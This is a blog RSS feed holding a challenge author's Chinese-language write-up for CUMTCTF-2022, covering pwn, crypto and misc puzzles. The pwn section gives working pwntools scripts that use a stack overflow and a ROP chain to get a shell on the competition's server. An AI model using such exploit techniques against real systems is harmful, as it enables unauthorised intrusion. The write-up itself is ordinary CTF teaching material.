<?xml version="1.0"?>
<rss version="2.0">
    <channel>
        <title>Prism Port • Posts by &#34;misc&#34; tag</title>
        <link>https://www.sycamore.top</link>
        <description></description>
        <language>zh-CN</language>
        <pubDate>Wed, 08 Jun 2022 14:04:04 +1000</pubDate>
        <lastBuildDate>Wed, 08 Jun 2022 14:04:04 +1000</lastBuildDate>
        <category>Python</category>
        <category>计算机视觉</category>
        <category>深度学习</category>
        <category>Crypto</category>
        <category>Hexo</category>
        <category>shokaX</category>
        <category>博客主题</category>
        <category>实习</category>
        <category>springboot</category>
        <category>CTF</category>
        <category>Misc</category>
        <category>Web</category>
        <category>Miec</category>
        <category>Re</category>
        <category>Pwn</category>
        <category>Backdoor</category>
        <category>Linux</category>
        <category>Kali</category>
        <category>Trojan horse</category>
        <category>Metasploit</category>
        <category>frp</category>
        <category>shellter</category>
        <category>Reverse Shell</category>
        <category>Develop</category>
        <category>Electron</category>
        <category>Google Translate</category>
        <category>node</category>
        <category>Hitokoto</category>
        <category>npm</category>
        <category>plugs</category>
        <category>RCE，loophole</category>
        <category>毕业设计</category>
        <category>机器学习</category>
        <category>Diary</category>
        <category>Australia</category>
        <category>Mod</category>
        <category>CP2077</category>
        <category>archive</category>
        <item>
            <guid isPermalink="true">https://www.sycamore.top/CyberSecurity/CTF/CUMTCTF-2022%E5%87%BA%E9%A2%98%E9%83%A8%E5%88%86wp/</guid>
            <title>CUMTCTF-2022出题部分wp</title>
            <link>https://www.sycamore.top/CyberSecurity/CTF/CUMTCTF-2022%E5%87%BA%E9%A2%98%E9%83%A8%E5%88%86wp/</link>
            <category>Python</category>
            <category>Crypto</category>
            <category>CTF</category>
            <category>Misc</category>
            <category>Pwn</category>
            <pubDate>Wed, 08 Jun 2022 14:04:04 +1000</pubDate>
            <description><![CDATA[ &lt;h2 id=&#34;pwn&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#pwn&#34;&gt;#&lt;/a&gt; PWN&lt;/h2&gt;
&lt;h3 id=&#34;nc&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#nc&#34;&gt;#&lt;/a&gt; nc&lt;/h3&gt;
&lt;p&gt;这题就不说了吧，连上啥都有，我连要用到的命令解释都给了～&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://res.cloudinary.com/sycamore/image/upload/v1682444312/Typera/2023/04/6c7177a450f396a3cc1df92db2cec62b.png&#34; alt=&#34;image-20230426013827815&#34; /&gt;&lt;/p&gt;
&lt;h3 id=&#34;ret2text&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#ret2text&#34;&gt;#&lt;/a&gt; ret2text&lt;/h3&gt;
&lt;p&gt;看一下保护：&lt;br /&gt;
&lt;img data-src=&#34;https://res.cloudinary.com/sycamore/image/upload/v1682444337/Typera/2023/04/8810580d090cd91812198696d7ddb02d.png&#34; alt=&#34;image-20230426013852620&#34; /&gt;&lt;br /&gt;
 主函数：&lt;br /&gt;
&lt;img data-src=&#34;https://res.cloudinary.com/sycamore/image/upload/v1682444396/Typera/2023/04/b70fb5e227640f018d72822fc557ad7e.png&#34; alt=&#34;image-20230426013952537&#34; /&gt;&lt;br /&gt;
 后门函数：&lt;br /&gt;
&lt;img data-src=&#34;https://res.cloudinary.com/sycamore/image/upload/v1682444400/Typera/2023/04/217429008da529ab0c39ef4f51553b97.png&#34; alt=&#34;image-20230426013957304&#34; /&gt;&lt;/p&gt;
&lt;p&gt;栈溢出就行，一张好图理解一下：&lt;br /&gt;
&lt;img data-src=&#34;https://res.cloudinary.com/sycamore/image/upload/v1682444407/Typera/2023/04/f1fddeaa3a59bd82ab8dbb7032f73399.png&#34; alt=&#34;image-20230426014002698&#34; /&gt;&lt;/p&gt;
&lt;p&gt;思路：用 ‘a&#39; 覆盖 buf 一直到覆盖上 ebp，然后将 ret (返回地址) 的地方写入为后门函数的地址。&lt;/p&gt;
&lt;p&gt;双击左侧栏的 backdoor 函数，右侧能找到函数地址如图：&lt;br /&gt;
&lt;img data-src=&#34;https://res.cloudinary.com/sycamore/image/upload/v1682444409/Typera/2023/04/0462346171ca0ff7f93c6db0364f57de.png&#34; alt=&#34;image-20230426014006566&#34; /&gt;&lt;/p&gt;
&lt;p&gt;直接照思路这么写，能打通本地，但是会打不通远程，因为栈帧没有平衡（hint），这时候中间插个 retn 的 gadget 就能解决。&lt;/p&gt;
&lt;p&gt;随便找个 retn 的地址&lt;br /&gt;
这个就能用：&lt;/p&gt;
&lt;p&gt;最后，脚本如下（环境没关，可以继续打远程）：&lt;img data-src=&#34;https://res.cloudinary.com/sycamore/image/upload/v1682444413/Typera/2023/04/d5ad6da67403e757b9bc721f47816524.png&#34; alt=&#34;image-20230426014010146&#34; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;figure class=&#34;highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;from&lt;/span&gt; pwn &lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; *&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;#r=process(b&amp;#x27;./ret2text&amp;#x27;)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;r=remote(&lt;span class=&#34;string&#34;&gt;b&amp;#x27;106.15.52.194&amp;#x27;&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;10002&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;backdoor=&lt;span class=&#34;number&#34;&gt;0x4011DD&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;retn=&lt;span class=&#34;number&#34;&gt;0x401203&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p=&lt;span class=&#34;string&#34;&gt;b&amp;#x27;a&amp;#x27;&lt;/span&gt;*&lt;span class=&#34;number&#34;&gt;40&lt;/span&gt;+p64(retn)+p64(backdoor)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;r.sendlineafter(&lt;span class=&#34;string&#34;&gt;b&amp;#x27;2022!&amp;#x27;&lt;/span&gt;,p)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;r.interactive()&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;h3 id=&#34;overflow&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#overflow&#34;&gt;#&lt;/a&gt; overflow&lt;/h3&gt;
&lt;p&gt;保护和之前 ret2text 的一样，&lt;br /&gt;
同样可以使用栈溢出漏洞，但是没有一个写好的 backdoor 函数了。&lt;/p&gt;
&lt;p&gt;shift+F12 查看字符串，能找到 /bin/sh ，双击得到地址为：0x404050&lt;br /&gt;
 左侧也能找到 system () 函数，&lt;br /&gt;
这时我们可以通过 rop 将 /bin/sh 装入 system () 函数中来 getshell。&lt;/p&gt;
&lt;p&gt;具体 ROP 时什么东西可以自行搜索，这里详细说一下怎么利用，&lt;br /&gt;
有了 system，有了 /bin/sh，唯一的问题就是传参了（因为 我们要的是 system (&amp;quot;/bin/sh&amp;quot;)，要把 /bin/sh 当作参数传到 system 执行嘛），&lt;br /&gt;
我们可以用 rop 做到这一点：&lt;br /&gt;
64 位程序通过寄存器存放参数，所以我们可以用 pop rdi 将 /bin/sh 字串的地址压入 rdi，然后 ret，再把 esp 指向 system () 函数地址执行就能 getshell 了。&lt;/p&gt;
&lt;p&gt;所以，我们只需要用到 pop rdi ret 一个 gadget，用 ROPgadget 工具搜索一下就能得到地址，命令如下：&lt;br /&gt;
 &lt;code&gt;ROPgadget --binary overflow --only &amp;quot;pop|ret&amp;quot;&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;最后还有平衡栈帧的问题注意一下，脚本如下：&lt;br /&gt;
&lt;figure class=&#34;highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;from&lt;/span&gt; pwn &lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; *&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;#r = process(&amp;#x27;./overflow&amp;#x27;)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;r=remote(&lt;span class=&#34;string&#34;&gt;b&amp;#x27;106.15.52.194&amp;#x27;&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;10001&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;pop_rdi=&lt;span class=&#34;number&#34;&gt;0x4012e3&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;bin_sh=&lt;span class=&#34;number&#34;&gt;0x404050&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;system=&lt;span class=&#34;number&#34;&gt;0x401090&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;retn=&lt;span class=&#34;number&#34;&gt;0x40101a&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p=&lt;span class=&#34;string&#34;&gt;b&amp;#x27;a&amp;#x27;&lt;/span&gt;*&lt;span class=&#34;number&#34;&gt;11&lt;/span&gt; + p64(pop_rdi) + p64(bin_sh) + p64(retn) + p64(system)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;r.sendlineafter(&lt;span class=&#34;string&#34;&gt;b&amp;#x27;name?\n&amp;#x27;&lt;/span&gt;,p)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;r.interactive()&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;h2 id=&#34;crypto&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#crypto&#34;&gt;#&lt;/a&gt; Crypto&lt;/h2&gt;
&lt;h3 id=&#34;caesar&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#caesar&#34;&gt;#&lt;/a&gt; Caesar&lt;/h3&gt;
&lt;p&gt;简单的凯撒加密...&lt;br /&gt;
 写个脚本遍历，或者网上找个线上的解密网站一位位地试，或者你能直接猜出来内容，都行...&lt;br /&gt;
 贴个遍历所有结果的脚本：&lt;br /&gt;
&lt;figure class=&#34;highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;model = &lt;span class=&#34;string&#34;&gt;&amp;quot;abcdefghijklmnopqrstuvwxyz&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;model2 = &lt;span class=&#34;string&#34;&gt;&amp;#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZ&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;str1 = &lt;span class=&#34;string&#34;&gt;&amp;quot;Fdhvdu_lv_wrr_Hdcb&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; key &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;range&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;27&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; s &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; str1:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; s.islower():&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            n = model.find(s)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            s = model[n-key]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;elif&lt;/span&gt; s.isupper():&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            n = model2.find(s)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            s = model2[n-key]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(s, end=&lt;span class=&#34;string&#34;&gt;&amp;#x27;&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;#x27;&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;br /&gt;
 得到 flag 内容为 Caesar_is_too_Eazy&lt;br /&gt;
（不觉着放眼望去只有这个能读通吗？）&lt;/p&gt;
&lt;h3 id=&#34;caesar-2&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#caesar-2&#34;&gt;#&lt;/a&gt; Caesar？&lt;/h3&gt;
&lt;p&gt;凯撒 + 栅栏&lt;br /&gt;
密文：fwid_huqifxf {vFv_ghhpwHbddd_q}&lt;br /&gt;
 结合题目知道这不是简单的凯撒，观察密文结构，仔细观察 {} 和 _ 的位置，基本能猜到是栅栏吧。。。&lt;/p&gt;
&lt;p&gt;用上题脚本遍历，挑出 f、c、b 开头的字串逐一尝试栅栏解密，可以得到最终的 flag&lt;br /&gt;
（因为栅栏不会改变第一个字母，所以分别是 flag、cumtctf、bxsctf，逐一尝试即可）。&lt;br /&gt;
虽然理论上来说两个解密的顺序反一反都能出，但这样更好解一点...&lt;/p&gt;
&lt;p&gt;ps：栅栏每组字数为 3&lt;/p&gt;
&lt;h2 id=&#34;misc&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#misc&#34;&gt;#&lt;/a&gt; Misc&lt;/h2&gt;
&lt;h3 id=&#34;fifo-lru-opt&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#fifo-lru-opt&#34;&gt;#&lt;/a&gt; fifo &amp;amp; lru &amp;amp; opt&lt;/h3&gt;
&lt;p&gt;本来还想放提示，没想到做出来的人挺多。&lt;br /&gt;
关于这三个算法，&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9ob3ViYi5naXRodWIuaW8vMjAyMC8xMC8wNC9vcy0xMC1wYWdlLWV4Y2hhbmdl&#34;&gt;这篇博客&lt;/span&gt;上都有了，就不多赘述了。&lt;br /&gt;
如果感兴趣的话，其他相关的算法这篇博客上也都有，挺全面的。&lt;/p&gt;
&lt;p&gt;fifo 算法内存状态为：&lt;br /&gt;
1  2  1  3  2  2  6  6  7  2  1  2  7  2  6&lt;br /&gt;
1  1  1  1  1  1  1  1  7  7  7  7  7  7  7&lt;br /&gt;
2  2  2  2  2  2  2  2  2  1  1  1  1  1&lt;br /&gt;
3  3  3  3  3  3  3  3  2  2  2  2&lt;br /&gt;
6  6  6  6  6  6  6  6  6&lt;br /&gt;
 调入队列为 1  2  3  6  7  1  2&lt;/p&gt;
&lt;p&gt;lru 算法内存状态为：&lt;br /&gt;
1  2  1  3  2  2  6  6  7  2  1  2  7  2  6&lt;br /&gt;
1  1  1  1  1  1  1  1  7  7  7  7  7  7  7&lt;br /&gt;
2  2  2  2  2  2  2  2  2  2  2  2  2  2&lt;br /&gt;
3  3  3  3  3  3  3  1  1  1  1  1&lt;br /&gt;
6  6  6  6  6  6  6  6  6&lt;br /&gt;
 调入队列为 1  2  3  6  7  1&lt;/p&gt;
&lt;p 123671212367112367=&#34;&#34;&gt;opt 算法内存状态为：&lt;br /&gt;
1  2  1  3  2  2  6  6  7  2  1  2  7  2  6&lt;br /&gt;
1  1  1  1  1  1  1  1  1  1  1  1  1  1  1&lt;br /&gt;
2  2  2  2  2  2  2  2  2  2  2  2  2  2&lt;br /&gt;
3  3  3  3  3  7  7  7  7  7  7  7&lt;br /&gt;
6  6  6  6  6  6  6  6  6&lt;br /&gt;
 调入队列为 1  2  3  6  7&lt;br /&gt;
 三者连起来得到 flag：cumtctf&lt;/p&gt;
&lt;h3 id=&#34;套&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#套&#34;&gt;#&lt;/a&gt; 套！&lt;/h3&gt;
&lt;p&gt;这道题，说实话就是拿来娱乐一下，送送分的 (/▽＼)...&lt;br /&gt;
 分三步：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;新约佛论禅（&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL2hpLnBjbW9lLm5ldC9idWRkaGEuaHRtbA==&#34;&gt;解密网址&lt;/span&gt;）&lt;/li&gt;
&lt;li&gt;Ook!（&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly90b29sLnlzbmVrby5jb20vYnJhaW5mdWNrLw==&#34;&gt;Brainfuck / Ook!&lt;/span&gt;）&lt;/li&gt;
&lt;li&gt;Brainfuck（网址与 Ook 一样）&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;左右&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#左右&#34;&gt;#&lt;/a&gt; 左 &amp;amp; 右&lt;/h3&gt;
&lt;p&gt;音频隐写&lt;br /&gt;
一个原音频（Counting_Stars.wav），一个修改过的（out.wav）&lt;/p&gt;
&lt;p&gt;我出题的过程：把 flag 加密成摩斯密码，把摩斯密码分成两部分，用脚本输出为摩斯电码音频，左右声道分别和原音频相加，同时右声道反向。&lt;br /&gt;
因为左右声道藏的内容不太一样，所以不能直接相加...&lt;/p&gt;
&lt;p&gt;用 Audacity 打开两个音频，放大查看如下（还是挺明显的吧）：&lt;br /&gt;
&lt;img data-src=&#34;https://res.cloudinary.com/sycamore/image/upload/v1682444431/Typera/2023/04/58af7c321f6bb65d3a0870493389096c.png&#34; alt=&#34;image-20230426014027631&#34; /&gt;&lt;br /&gt;
 所以，得到摩斯的方法：out 的左声道 - 原音频左声道，可得前半部分 flag，out 的右声道 + 原音频右声道，可得后半部分 flag&lt;/p&gt;
&lt;p&gt;至于怎么加怎么减，我是使用 python 写的脚本，当然还有其他方法（比如有个同学使用的 Au，我是真没想到可以这么解），&lt;br /&gt;
不过个人觉着都可以试着用 python 写写看，这样以后遇到类似的题目，即使可能用不了其他的方法，或许你也可以用 python 解决。&lt;br /&gt;
&lt;figure class=&#34;highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; wave&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; struct&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ori = wave.&lt;span class=&#34;built_in&#34;&gt;open&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;Counting_Stars.wav&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;#x27;rb&amp;#x27;&lt;/span&gt;)	&lt;span class=&#34;comment&#34;&gt;# 原音频&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;out = wave.&lt;span class=&#34;built_in&#34;&gt;open&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;out.wav&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;#x27;rb&amp;#x27;&lt;/span&gt;)				&lt;span class=&#34;comment&#34;&gt;# 隐写音频&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;exp = wave.&lt;span class=&#34;built_in&#34;&gt;open&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;exp.wav&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;#x27;wb&amp;#x27;&lt;/span&gt;)				&lt;span class=&#34;comment&#34;&gt;# 处理过后得到的摩斯电码音频&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;exp.setnchannels(&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;)			&lt;span class=&#34;comment&#34;&gt;# 设置声道数为2&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;exp.setsampwidth(&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;)			&lt;span class=&#34;comment&#34;&gt;# 设置量化位数为2&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;exp.setframerate(&lt;span class=&#34;number&#34;&gt;44100&lt;/span&gt;)		&lt;span class=&#34;comment&#34;&gt;# 设置采样频率为44100&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; i &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;range&lt;/span&gt;(out.getnframes()):			&lt;span class=&#34;comment&#34;&gt;# 一帧帧地读取数据&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	lori,rori=struct.unpack(&lt;span class=&#34;string&#34;&gt;&amp;#x27;hh&amp;#x27;&lt;/span&gt;, ori.readframes(&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;))	&lt;span class=&#34;comment&#34;&gt;# 原音频左右声道数据分别存入lori、rori&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	lout,rout=struct.unpack(&lt;span class=&#34;string&#34;&gt;&amp;#x27;hh&amp;#x27;&lt;/span&gt;, out.readframes(&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	lexp = lout - lori		&lt;span class=&#34;comment&#34;&gt;# 左声道相减，存入lexp&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	rexp = rout + rori&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	exp.writeframes(struct.pack(&lt;span class=&#34;string&#34;&gt;&amp;#x27;hh&amp;#x27;&lt;/span&gt;,lexp,rexp))		&lt;span class=&#34;comment&#34;&gt;# 把lexp、rexp的数据打包后存入exp.wav&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;br /&gt;
 解出 exp.wav 之后，去摩斯解密的网站解密即可得到 flag 的内容。&lt;/p&gt;
&lt;h3 id=&#34;嘿嘿压缩包&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#嘿嘿压缩包&#34;&gt;#&lt;/a&gt; 嘿嘿，压缩包？&lt;/h3&gt;
&lt;p&gt;简单的 LSB + ZIP 压缩包 + SSTV&lt;/p&gt;
&lt;p&gt;给了一张图和一个压缩包，&lt;br /&gt;
注意图片的名字是 hint.png。。。&lt;/p&gt;
&lt;p&gt;stegsolve 打开，LSB 隐写能看到提示信息：&lt;br /&gt;
1.Plaintext_Attack 2. zSdL#Z7oym!9j8m3&lt;/p&gt;
&lt;p&gt;第一个提示明文攻击，第二个是密码&lt;br /&gt;
（可能是我的密码设置的有问题？最后一位是 3，可能有点迷惑性...）&lt;/p&gt;
&lt;p&gt;打开压缩包，里面有一个名字一样的图片，用同样的压缩算法压缩已知图片，观察二者的 CRC 校验码一致，结合之前的提示，用 ARCHPR 使用明文攻击解开&lt;br /&gt;
（这里出 bug 了，最后压缩的时候放错了一个压缩包，导致明文攻击失败，现文件已更新）&lt;br /&gt;
明文攻击后，可以获得压缩包 flag.zip，可使用之前 LSB 得到的密码解开.&lt;/p&gt;
&lt;p&gt;解开后，获得音频文件 flag.wav，可以听出来是 SSTV  （。＾▽＾）&lt;/p&gt;
